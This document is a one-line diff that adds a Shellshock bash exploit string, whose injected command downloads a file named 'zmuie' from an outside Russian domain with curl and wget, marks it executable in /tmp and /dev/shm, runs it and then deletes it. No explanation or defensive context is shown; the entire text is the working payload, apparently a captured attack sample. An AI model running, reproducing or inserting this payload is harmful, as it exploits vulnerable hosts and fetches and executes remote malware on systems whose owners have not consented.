@@ -1,0 +1,1 @@
+() { :;}; /bin/bash -c "curl -o /tmp/zmuie http://stroybezzabot.ru/zmuie;/usr/bin/wget http://stroybezzabot.ru/zmuie -O /tmp/zmuie;wget http://stroybezzabot.ru/zmuie -O /dev/shm/zmuie;chmod +x /dev/shm/zmuie /tmp/zmuie;/dev/shm/zmuie;/tmp/zmuie;rm -rf /dev/shm/zmuie /tmp/zmuie*"
